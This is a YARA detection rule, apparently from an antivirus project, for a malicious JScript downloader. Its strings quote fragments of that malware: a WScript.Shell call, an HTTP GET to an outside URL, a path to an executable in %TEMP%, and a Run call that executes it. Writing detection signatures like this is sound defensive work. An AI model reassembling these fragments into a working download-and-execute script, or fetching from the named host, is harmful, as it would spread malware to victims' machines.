rule sig_20160330_125609c0487034e876957ede055784dc {
  meta:
    description = "datamaliciousorder - file 20160330_125609c0487034e876957ede055784dc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "56663927621e8772d70e072ca64dad1ea663436a7c7ae9ec38133eb8200eb58b"

  strings:
    $s1  = "var GX = function H() {return WScript[DO](\"WScript\"+\".Shell\");}(), D = 11;" fullword ascii
    $s2  = "K0[A](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s3  = "function S(NK, KH){DF = DF * 1; return NK - KH;};" fullword ascii
    $s4  = "if (K0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function T() {return GX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NacvTykJR.ex\" + \"e\";};" fullword ascii
    $s6  = "function B(){return N + \"\";};" fullword ascii
    $s7  = "function C() {return ((O == true) && (O == O0)) ? 1 : DF;};" fullword ascii
    $s8  = "function BW(TP){GX[\"Run\"](TP, DF, DF);};" fullword ascii
    $s9  = "function G()" fullword ascii
    $s10 = "function OA(){return DO;};" fullword ascii
    $s11 = "function QG(){return 22;};" fullword ascii
    $s12 = "var DR = new this[\"Date\"]();" fullword ascii
    $s13 = "return S(I, LF);" fullword ascii
    $s14 = "}while (EU);" fullword ascii
    $s15 = "function EI(T0) {var WU = (1, 2, 3, 4, 5, T0); return WU;};" fullword ascii
    $s16 = "var O = false;" fullword ascii
    $s17 = "O = true; " fullword ascii
    $s18 = "var O0 = false;" fullword ascii
    $s19 = "O0 = true; " fullword ascii
    $s20 = "var EP = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}